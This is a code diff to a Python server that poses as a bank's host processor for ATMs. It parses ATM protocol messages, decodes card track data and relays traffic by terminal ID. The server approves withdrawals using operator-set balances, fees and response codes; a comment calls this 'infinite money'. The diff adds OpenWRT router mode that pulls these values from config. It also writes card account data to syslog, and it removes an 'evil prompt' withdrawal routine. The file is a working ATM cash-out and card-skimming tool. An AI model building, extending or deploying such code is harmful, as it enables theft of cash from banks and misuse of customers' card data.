@@ -11,20 +11,92 @@ import datetime
 import json
 from pprint import pprint
 from random import randint
+import logging
+import logging.handlers
+
+logs = logging.getLogger('MyLogger')
+logs.setLevel(logging.DEBUG)
+
+handler = logging.handlers.SysLogHandler(address = '/dev/log')
+
+logs.addHandler(handler)
+
+OPENWRTMODE=True
 
 
+if OPENWRTMODE:
+	import subprocess
+	
+
+# code needs some serious cleanup and switch from prints to loggers.
+
+BCODE = "000"
 BPERSON = "Tom Crosant"
 BBALANCE = 10000
+BFEE = "10"
 
 APIURL = "http://127.0.0.1"
 HOST, PORT = "0.0.0.0", 2265
 ENDPOINT = True
 
+
+# edit here to setup new ATMS from IDs... 
 ATMLIST = {
 	'81236918':'127.0.0.1'
 }
 
 BANKDATA={}
+
+def openwrt_updates():
+	global BCODE,BPERSON,BBALANCE
+	import subprocess
+	DEBUG=False
+	def get_setting(key_name):
+		command = str("uci show "+key_name).split(" ")
+		pprint(command)
+		outs = None
+		try:
+			proc = subprocess.Popen(command,stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+			outs, errs = proc.communicate() #timeout=15)
+			if outs is not None and outs != '' and "=" in outs:
+				outs = str(outs).strip().replace("'","").replace("'","").split("=")
+				if len(outs)>1:
+					outs = outs[1]
+			else:
+				outs = None
+		except Exception as e:
+			#proc.kill()
+    			#outs, errs = proc.communicate()
+			logs.error("error while reading config",e)
+		pprint(outs)
+		return str(outs).strip()
+	# things we look for
+	if OPENWRTMODE:
+		check_balance = "atm_setup.config.balance"
+		check_fee = "atm_setup.config.fee"
+		check_enabled = "atm_setup.config.enabled"
+		check_name = "atm_setup.config.name"
+		c = get_setting(check_balance)
+		if c is not None:
+			if DEBUG:
+				print("updating BBALANCE",c)
+			BBALANCE=c
+		c = get_setting(check_fee)
+		if c is not None:
+			if DEBUG:
+				print("updating BFEE",c)
+			BFEE=c
+		c = get_setting(check_enabled)
+		if c is not None:
+			if DEBUG:
+				print("updating BCODE",c)
+			if int(c) == 1:
+				BCODE="111"
+			else:
+				BCODE="000"
+		c = get_setting(check_name)
+		if c is not None:
+			BPERSON=c
 
 def calcLRC(input):
 	checksum = 0
@@ -64,6 +136,8 @@ def nicePrint(buf,m="Packet"):
 					nice_output+=b
 	print("%s Raw:  %s"%(m,nice_output))
 	print("%s Buf: %s"%(m,buf.encode('hex')))
+	logs.info("%s Raw:  %s"%(m,nice_output))
+	logs.info("%s Buf: %s"%(m,buf.encode('hex')))
 	b = ' '.join(format(ord(x), 'b') for x in buf)
 #	   print("%s Binary: %s"%(m,str(b)))
 
@@ -107,14 +181,14 @@ def clearBit(int_type, offset):
 
 def getChunk(msg,size,offset=0):
 	chunk = msg[offset:offset+size]
-	print("Got: [%d,%d]%s"%(offset,offset+size,chunk.encode('hex')))
+	logs.info("Got: [%d,%d]%s"%(offset,offset+size,chunk.encode('hex')))
 	return chunk
 
 def decodeCard(track):
 	FS = "="
 	track=track.lstrip(';')
 	pprint(track)
-	pprint(track[0])
+	logs.info("got cc card id track 0 ",track[0])
 	if len(track)>0:
 		offset = 0
 		field = {}
@@ -201,7 +275,7 @@ class Transactions():
 #			pprint(buf.encode('hex'))
 		fields = buf.split('\x1c')
 		if len(fields[0])>(18):
-			print(">> DEBUG MODE DETECTED FROM ATM")
+			logs.warning(">> DEBUG MODE DETECTED FROM ATM")
 			field['communications_identifier'] = getChunk(buf,8,offset)
 			offset+=8
 			field['terminal_id'] = getChunk(buf,2,offset)
@@ -359,7 +433,7 @@ class Transactions():
 		pprint(hdr)
 		pprint(body)
 		# process here
-		response_code = "000"
+		response_code = BCODE
 		authorization_number = str(''.join(["{}".format(randint(0, 9)) for num in range(0, 8)]))
 		print(fee)
 		print(amount)
@@ -371,7 +445,7 @@ class Transactions():
 		pprint(track)
 		currentbalance=BBALANCE
 		print("\n\nCustomer: %s (%s) has balance of %s"%(BPERSON,track['primary_account_number'],currentbalance))
-		fee = 0
+		fee = BFEE
 
 		# API CALL
 		try:
@@ -402,11 +476,11 @@ class Transactions():
 
 		# !!!!! LOOK HERE !!!!!!
 		# set value of amount due to 0 and fee to 10, next set both to 0 and deduct
-		response_code = "000" # 000 = success , 111 = failure
+		response_code = BCODE # 000 = success , 111 = failure
 		total_balance = BBALANCE # infinite money
 		track = decodeCard(body['track2'])
 		print("\n\nCustomer: %s (%s) has balance of %s"%(BPERSON,track['primary_account_number'],total_balance))
-		fee = 50 # 5000 e.g. 50.00
+		fee = BFEE # 5000 e.g. 50.00
 
 		authorization_number = str(''.join(["{}".format(randint(0, 9)) for num in range(0, 8)]))
 		try:
@@ -418,47 +492,6 @@ class Transactions():
 			response_code = "111" # 2424
 		# repeating stuff here... sadly
 		print("\n\n\n")
-		fee = str(fee*100).zfill(8)
-		total_balance=str(total_balance*100).zfill(8)
-		multi_part_message = "0" # not set
-		trasac_date = time.strftime('%m%d%y')
-		trasac_time = time.strftime('%H%M%S')
-		bus_date = time.strftime('%m%d%y')
-		msg = multi_part_message + '\x1c' + termid + '\x1c' + action + '\x1c' + body['sequence_number'] + "\x1c" + str(response_code) + "\x1c" + str(authorization_number) + "\x1c" + str(trasac_date) + "\x1c" + str(trasac_time) + "\x1c" + str(bus_date) + "\x1c" + balance + "\x1c" + fee + "\x1c" + "\x1c" + "\x03"
-		nicePrint(msg,"Transaction PROCESS SEND:")
-		return makeMessage(msg,True,True)
-
-
-	def process_evil_prompt_withdrawal(self,termid,msg,action):
-		# TODO: payment processing function from algorythm oncr addfed
-		a,amount,fee,hdr,body = self.process_transaction_message(termid,msg,action)
-		pprint(hdr)
-		pprint(body)
-
-		# !!!!! LOOK HERE !!!!!!
-		# set value of amount due to 0 and fee to 10, next set both to 0 and deduct
-		response_code = "000" # 000 = success , 111 = failure
-		total_balance = BBALANCE # infinite money
-		track = decodeCard(body['track2'])
-		print("\n\nCustomer: %s (%s) has balance of %s"%(BPERSON,track['primary_account_number'],total_balance))
-		fee = 0 # 5000 e.g. 50.00
-		try:
-			total_balance=int(raw_input("Enter account balance: "))
-			fee = int(raw_input("Enter fee for ATM: "))
-		except:
-			print("Invalid input, defaulting to - Balance:%d and Fee:%d"%(total_balance,fee))
-
-		authorization_number = str(''.join(["{}".format(randint(0, 9)) for num in range(0, 8)]))
-		try:
-			calculation = (int(total_balance)-((int(amount)*1)+int(fee)))
-			balance = str(calculation*100).replace("-","").zfill(8)
-			#balance = str((int(total_balance)-((int(amount)*100)+int(fee)*100))).replace("-","").zfill(8)
-			print("\n!!! Deducting (%s+%s) [%s] from %s to make %s (%s)\n\n"%(str(amount),str(fee),str((amount+fee)),str(total_balance),str(calculation),str(balance)))
-		except Exception as e:
-			traceback.print_exc()
-			response_code = "111" # 2424
-		print("\n\n")
-		# repeating stuff here... sadly
 		fee = str(fee*100).zfill(8)
 		total_balance=str(total_balance*100).zfill(8)
 		multi_part_message = "0" # not set
@@ -529,6 +562,9 @@ class Transactions():
 	def processMessage(self,buf):
 		hdr = self.parseHeader(buf)
 		pprint(hdr)
+		# update openwrt handlers if applicable 
+		openwrt_updates()
+		# and continue 
 		if 'transaction_code' not in hdr:
 			return None
 		termid = hdr['terminal_id']
@@ -570,7 +606,7 @@ class ATMMultiHandler(SocketServer.BaseRequestHandler):
 		hdr = t.parseHeader(data)
 		print("GOT MESSAGE")
 		if 'terminal_id' not in hdr:
-			print("Error! Error parsing message!")
+			logs.error("Error! Error parsing message!")
 			nicePrint(data)
 			return None
 		else:
@@ -581,7 +617,7 @@ class ATMMultiHandler(SocketServer.BaseRequestHandler):
 			else:
 				host = self.atmtoip(hdr['terminal_id'])
 				if host is None:
-					print("Error! Unable to find IP<--->ATM ID mapping!")
+					logs.error("Error! Unable to find IP<--->ATM ID mapping!")
 					nicePrint(data)
 					return None
 				m = self.relay(data,host)
